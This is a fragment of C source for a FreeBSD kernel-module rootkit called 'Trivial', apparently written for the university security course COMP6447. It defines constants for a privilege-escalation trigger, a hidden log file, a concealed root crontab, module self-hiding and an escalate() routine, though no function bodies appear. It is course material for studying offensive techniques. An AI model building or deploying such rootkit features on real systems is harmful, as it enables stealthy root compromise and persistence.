/*
 * Trivial
 * COMP6447 19T2 Rootkit
 * Joshua Kwong & Hogan Richardson
 *
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/stat.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/dirent.h> 
#include <sys/ucred.h> 
#include <sys/resourcevar.h>
#include <sys/sysproto.h>
#include <sys/pcpu.h>
#include <sys/syscallsubr.h>
#include <sys/fcntl.h>
#include <sys/file.h>
#include <sys/uio.h>
#include <sys/namei.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

/* Constants */
#define NAME "trivial"
#define F_NAME "trivial-6d4c9cf5e022a07ea8013a4b07a30a88270c65dfd5223ccc3964d9a7b4525008.ko"
#define F_NAME2 "hideProc-2fcf3aeb092fd71870420b2158873b2b774fb5d23f7fa6bd3a632ac02900d76a.ko"
#define ESCALATE_TRIGGER "5c49bd22eb6767f002f6236fd09a84eef560443d7a5fdbe4be3a344ea127bf78"
#define LOGPATH "/tmp/log_core-6dc9cf5e022a07ea8013a4b07a30a88270c65dfd5223ccc3964d9a7b4525008"
#define LOGBUFLEN 1024
#define CONTENTS_CONCEAL "/var/cron/tabs/toor"

/* Feature Definitions */
#define HIDE_KLD
// #define DEBUG

#include "hooks.h"

/* Loadable Kernel Module */
int
load(struct module *, int, void *);

/* Helper Functions */
void
escalate (struct thread *);

void
unload_kld_list (void);
